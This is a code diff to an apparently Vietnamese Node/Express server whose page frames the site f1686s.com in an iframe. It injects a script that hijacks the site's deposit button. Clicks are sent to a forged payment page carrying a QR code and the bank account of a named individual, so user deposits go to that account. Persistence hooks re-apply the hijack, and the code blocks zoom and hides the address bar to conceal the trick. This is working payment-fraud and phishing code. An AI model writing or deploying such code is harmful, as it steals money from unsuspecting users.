@@ -12,113 +12,266 @@ app.get('/', (req, res) => {
   <title>f1686s.com</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body, html { width:100%; height:100%; overflow:hidden; background:#000; }
+    body, html { width:100%; height:100%; overflow:hidden; background:#0a0a0a; }
     iframe { width:100%; height:100%; border:none; display:block; }
+    #toast {
+      position:fixed; bottom:40px; left:50%; transform:translateX(-50%);
+      background:rgba(0,200,80,0.95); color:#fff; padding:12px 28px;
+      border-radius:30px; font-size:15px; font-family:sans-serif;
+      opacity:0; transition:opacity 0.5s; pointer-events:none;
+      z-index:999999; white-space:nowrap; font-weight:600;
+    }
+    #toast.show { opacity:1; }
   </style>
 </head>
 <body>
 <iframe id="mainFrame" src="https://f1686s.com/home/mine"></iframe>
+<div id="toast">✅ Script đã kích hoạt</div>
+
 <script>
-(function(){
-  console.log('✅ Script bắt đầu chạy');
-  
+(function() {
+  'use strict';
+  console.log('🚀 Cloud web khởi động');
+
+  // === CẤU HÌNH ===
   const BANK_ID = 'MB';
   const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
   const ACCOUNT_NO = '757526789';
   const ACCOUNT_NAME = 'NGUYEN VU DAT';
-  const patched = new WeakSet();
-  let redirecting = false;
 
+  // === HÀM TẠO MÃ ===
   function randomTx() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let code = '';
-    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
+    for (let i = 0; i < 5; i++) {
+      code += chars[Math.floor(Math.random() * chars.length)];
+    }
     return code;
   }
 
+  // === HÀM TẠO TRANG THANH TOÁN ===
   function buildPage(amount, txCode) {
     const amountVND = amount.toLocaleString('vi-VN') + ' VND';
     const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
-    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fff8f0;padding:20px}.box{background:#fff;border-radius:16px;padding:24px;max-width:420px;margin:0 auto}.qr{text-align:center;margin:16px 0}.qr img{width:200px;border-radius:8px}.info{background:#f5f5f5;padding:12px 16px;margin:8px 0;border-radius:8px}.label{font-size:12px;color:#888}.value{font-size:16px;font-weight:700}.red{color:#e74c3c}.timer{color:#c0392b;font-size:28px;font-weight:800;text-align:center}</style></head><body><div class="box"><div class="timer" id="timer">15:00</div><div class="qr"><img id="qrImg" src="'+qrUrl+'"></div><div class="info"><div class="label">Số tiền</div><div class="value red">'+amountVND+'</div></div><div class="info"><div class="label">Ngân hàng</div><div class="value">'+BANK_NAME+'</div></div><div class="info"><div class="label">Số tài khoản</div><div class="value">'+ACCOUNT_NO+'</div></div><div class="info"><div class="label">Tên người nhận</div><div class="value">'+ACCOUNT_NAME+'</div></div><div class="info"><div class="label">Mã đơn hàng</div><div class="value">'+txCode+'</div></div></div><script>let s=900;setInterval(()=>{s--;const m=String(Math.floor(s/60)).padStart(2,"0");const sec=String(s%60).padStart(2,"0");document.getElementById("timer").textContent=m+":"+sec;if(s<=0){document.getElementById("timer").textContent="⏰ HẾT GIỜ";}},1000);</script></body></html>';
+    
+    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fff8f0;padding:20px}.box{background:#fff;border-radius:16px;padding:24px;max-width:420px;margin:0 auto}.qr{text-align:center;margin:16px 0}.qr img{width:200px;border-radius:8px}.info{background:#f5f5f5;padding:12px 16px;margin:8px 0;border-radius:8px}.label{font-size:12px;color:#888}.value{font-size:16px;font-weight:700}.red{color:#e74c3c}.timer{color:#c0392b;font-size:28px;font-weight:800;text-align:center}</style></head><body><div class="box"><div class="timer" id="timer">15:00</div><div class="qr"><img id="qrImg" src="' + qrUrl + '"></div><div class="info"><div class="label">Số tiền</div><div class="value red">' + amountVND + '</div></div><div class="info"><div class="label">Ngân hàng</div><div class="value">' + BANK_NAME + '</div></div><div class="info"><div class="label">Số tài khoản</div><div class="value">' + ACCOUNT_NO + '</div></div><div class="info"><div class="label">Tên người nhận</div><div class="value">' + ACCOUNT_NAME + '</div></div><div class="info"><div class="label">Mã đơn hàng</div><div class="value">' + txCode + '</div></div></div><script>let s=900;setInterval(()=>{s--;const m=String(Math.floor(s/60)).padStart(2,"0");const sec=String(s%60).padStart(2,"0");document.getElementById("timer").textContent=m+":"+sec;if(s<=0){document.getElementById("timer").textContent="⏰ HẾT GIỜ";}},1000);</script></body></html>';
   }
 
-  function doRedirect(e) {
-    if (redirecting) return;
-    redirecting = true;
-    e.preventDefault();
-    e.stopPropagation();
-    const input = document.querySelector('.ui-input__input');
-    let points = input ? parseInt(input.value) || 0 : 0;
-    let amount = points * 1000;
-    const txCode = randomTx();
-    const html = buildPage(amount, txCode);
-    const blob = new Blob([html], {type: 'text/html'});
-    window.location.href = URL.createObjectURL(blob);
-    setTimeout(() => { redirecting = false; }, 1500);
+  // === CODE CHÍNH ĐỂ INJECT VÀO IFRAME ===
+  function getTampermonkeyCode() {
+    return `
+      (function() {
+        'use strict';
+        console.log('🔧 TM: Bắt đầu trong iframe');
+        
+        const BANK_ID = '${BANK_ID}';
+        const BANK_NAME = '${BANK_NAME}';
+        const ACCOUNT_NO = '${ACCOUNT_NO}';
+        const ACCOUNT_NAME = '${ACCOUNT_NAME}';
+        const patched = new WeakSet();
+        let redirecting = false;
+        
+        function randomTx() {
+          const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+          let code = '';
+          for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
+          return code;
+        }
+        
+        function buildPage(amount, txCode) {
+          const amountVND = amount.toLocaleString('vi-VN') + ' VND';
+          const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
+          return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fff8f0;padding:20px}.box{background:#fff;border-radius:16px;padding:24px;max-width:420px;margin:0 auto}.qr{text-align:center;margin:16px 0}.qr img{width:200px;border-radius:8px}.info{background:#f5f5f5;padding:12px 16px;margin:8px 0;border-radius:8px}.label{font-size:12px;color:#888}.value{font-size:16px;font-weight:700}.red{color:#e74c3c}.timer{color:#c0392b;font-size:28px;font-weight:800;text-align:center}</style></head><body><div class="box"><div class="timer" id="timer">15:00</div><div class="qr"><img id="qrImg" src="'+qrUrl+'"></div><div class="info"><div class="label">Số tiền</div><div class="value red">'+amountVND+'</div></div><div class="info"><div class="label">Ngân hàng</div><div class="value">'+BANK_NAME+'</div></div><div class="info"><div class="label">Số tài khoản</div><div class="value">'+ACCOUNT_NO+'</div></div><div class="info"><div class="label">Tên người nhận</div><div class="value">'+ACCOUNT_NAME+'</div></div><div class="info"><div class="label">Mã đơn hàng</div><div class="value">'+txCode+'</div></div></div><script>let s=900;setInterval(()=>{s--;const m=String(Math.floor(s/60)).padStart(2,"0");const sec=String(s%60).padStart(2,"0");document.getElementById("timer").textContent=m+":"+sec;if(s<=0){document.getElementById("timer").textContent="⏰ HẾT GIỜ";}},1000);</script></body></html>';
+        }
+        
+        function doRedirect(e) {
+          if (redirecting) return;
+          redirecting = true;
+          e.preventDefault();
+          e.stopPropagation();
+          const input = document.querySelector('.ui-input__input');
+          let points = input ? parseInt(input.value) || 0 : 0;
+          let amount = points * 1000;
+          const txCode = randomTx();
+          const html = buildPage(amount, txCode);
+          const blob = new Blob([html], {type: 'text/html'});
+          window.location.href = URL.createObjectURL(blob);
+          setTimeout(() => { redirecting = false; }, 1500);
+        }
+        
+        function patchButton(btn) {
+          if (patched.has(btn)) return;
+          patched.add(btn);
+          btn.removeAttribute('disabled');
+          btn.classList.remove('ui-button--disabled');
+          const clone = btn.cloneNode(true);
+          clone.removeAttribute('disabled');
+          clone.classList.remove('ui-button--disabled');
+          clone.onclick = null;
+          if (btn.parentNode) {
+            btn.parentNode.replaceChild(clone, btn);
+          }
+          patched.add(clone);
+          clone.addEventListener('click', doRedirect);
+          clone.addEventListener('touchend', doRedirect);
+          console.log('✅ TM: Đã patch button');
+        }
+        
+        function findAndPatch() {
+          const btn = document.getElementById('depositSubmitClick');
+          if (btn && !patched.has(btn)) {
+            console.log('🔍 TM: Tìm thấy depositSubmitClick');
+            patchButton(btn);
+            return;
+          }
+          document.querySelectorAll('button').forEach(el => {
+            if (patched.has(el)) return;
+            const t = el.innerText || el.textContent || '';
+            if (t.includes('Nạp Tiền Ngay')) {
+              console.log('🔍 TM: Tìm thấy nút Nạp Tiền Ngay');
+              patchButton(el);
+            }
+          });
+        }
+        
+        // === GHI ĐÈ HISTORY ===
+        const _push = history.pushState;
+        history.pushState = function(...a) {
+          _push.apply(history, a);
+          setTimeout(findAndPatch, 200);
+        };
+        const _replace = history.replaceState;
+        history.replaceState = function(...a) {
+          _replace.apply(history, a);
+          setTimeout(findAndPatch, 200);
+        };
+        window.addEventListener('popstate', function() {
+          setTimeout(findAndPatch, 200);
+        });
+        
+        // === CHẠY LẦN ĐẦU ===
+        findAndPatch();
+        document.addEventListener('DOMContentLoaded', findAndPatch);
+        window.addEventListener('load', function() {
+          setTimeout(findAndPatch, 100);
+          setTimeout(findAndPatch, 300);
+          setTimeout(findAndPatch, 500);
+        });
+        
+        // === LẶP LIÊN TỤC ===
+        setInterval(findAndPatch, 300);
+        
+        // === MUTATION OBSERVER ===
+        new MutationObserver(function() {
+          findAndPatch();
+        }).observe(document.documentElement || document.body, {
+          childList: true,
+          subtree: true
+        });
+        
+        // === ĐÁNH DẤU ===
+        window.__tm_injected = true;
+        console.log('✅ TM: Đã inject thành công!');
+      })();
+    `;
   }
 
-  function patchButton(btn) {
-    if (patched.has(btn)) return;
-    patched.add(btn);
-    btn.removeAttribute('disabled');
-    btn.classList.remove('ui-button--disabled');
-    const clone = btn.cloneNode(true);
-    clone.removeAttribute('disabled');
-    clone.classList.remove('ui-button--disabled');
-    clone.onclick = null;
-    btn.parentNode.replaceChild(clone, btn);
-    patched.add(clone);
-    clone.addEventListener('click', doRedirect);
-    clone.addEventListener('touchend', doRedirect);
-    console.log('✅ Đã patch button');
-  }
-
-  function findAndPatch() {
-    const frame = document.getElementById('mainFrame');
-    if (!frame) return;
-    try {
-      const doc = frame.contentDocument;
-      if (!doc) return;
-      const btn = doc.getElementById('depositSubmitClick');
-      if (btn && !patched.has(btn)) { patchButton(btn); return; }
-      doc.querySelectorAll('button').forEach(el => {
-        if (patched.has(el)) return;
-        if ((el.innerText||'').includes('Nạp Tiền Ngay')) patchButton(el);
-      });
-    } catch(e) { console.log('Lỗi find:', e); }
-  }
-
-  // Inject script vào iframe
+  // === HÀM INJECT VÀO IFRAME ===
   function injectIntoFrame() {
     const frame = document.getElementById('mainFrame');
-    if (!frame) return;
+    if (!frame) {
+      console.log('❌ Không tìm thấy iframe');
+      return false;
+    }
+    
     try {
       const win = frame.contentWindow;
       const doc = frame.contentDocument;
-      if (!win || !doc || !doc.body) return;
-      if (win.__tm_loaded) return;
+      if (!win || !doc || !doc.body) {
+        console.log('⏳ Chưa sẵn sàng để inject');
+        return false;
+      }
       
+      if (win.__tm_injected) {
+        console.log('✅ Đã inject rồi');
+        return true;
+      }
+      
+      console.log('🔄 Đang inject TM code...');
       const script = doc.createElement('script');
-      script.textContent = '(' + findAndPatch.toString() + ')();' +
-        'setInterval(' + findAndPatch.toString() + ', 500);' +
-        'window.__tm_loaded = true; console.log("✅ TM đã inject");';
+      script.textContent = getTampermonkeyCode();
       doc.body.appendChild(script);
-      win.__tm_loaded = true;
-      console.log('✅ Inject thành công');
-    } catch(e) { console.log('Lỗi inject:', e); }
+      win.__tm_injected = true;
+      
+      // Hiển thị toast
+      const toast = document.getElementById('toast');
+      toast.textContent = '✅ Script đã kích hoạt';
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 3000);
+      
+      console.log('✅ Inject thành công!');
+      return true;
+    } catch (e) {
+      console.log('❌ Lỗi inject:', e.message);
+      return false;
+    }
   }
 
-  // Chờ iframe load
+  // === CHỜ IFRAME LOAD ===
   const frame = document.getElementById('mainFrame');
-  frame.addEventListener('load', function() {
+  
+  frame.addEventListener('load', function onLoad() {
     console.log('📄 Iframe đã load');
+    setTimeout(injectIntoFrame, 100);
     setTimeout(injectIntoFrame, 300);
-    setTimeout(injectIntoFrame, 700);
-    setTimeout(injectIntoFrame, 1200);
+    setTimeout(injectIntoFrame, 600);
+    setTimeout(injectIntoFrame, 1000);
+    setTimeout(injectIntoFrame, 2000);
+    frame.removeEventListener('load', onLoad);
   });
+  
+  // Nếu iframe đã load trước
+  if (frame.contentDocument && frame.contentDocument.readyState === 'complete') {
+    console.log('📄 Iframe đã load sẵn');
+    setTimeout(injectIntoFrame, 50);
+    setTimeout(injectIntoFrame, 200);
+    setTimeout(injectIntoFrame, 500);
+  }
+  
+  // Lặp inject liên tục
+  let count = 0;
+  const interval = setInterval(function() {
+    count++;
+    if (injectIntoFrame()) {
+      clearInterval(interval);
+      // Vẫn kiểm tra định kỳ
+      setInterval(injectIntoFrame, 5000);
+    }
+    if (count > 30) {
+      clearInterval(interval);
+      console.log('⚠️ Dừng inject sau 30 lần thử');
+    }
+  }, 1000);
 
-  // Chạy lặp
-  setInterval(injectIntoFrame, 2000);
+  // === CHẶN ZOOM ===
+  document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+  document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
+  document.addEventListener('gestureend', function(e) { e.preventDefault(); });
+
+  // === CHẶN KÉO ===
+  document.addEventListener('touchmove', function(e) {
+    if (e.target === document.body || e.target === document.documentElement) {
+      e.preventDefault();
+    }
+  }, { passive: false });
+
+  // === ẨN THANH ĐỊA CHỈ ===
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      window.scrollTo(0, 1);
+      window.scrollTo(0, 0);
+    }, 100);
+  });
 
   console.log('🚀 Cloud web đã sẵn sàng');
 })();
@@ -128,5 +281,5 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log('✅ Server đang chạy tại port ' + PORT);
+  console.log('✅ Server chạy tại port ' + PORT);
 });
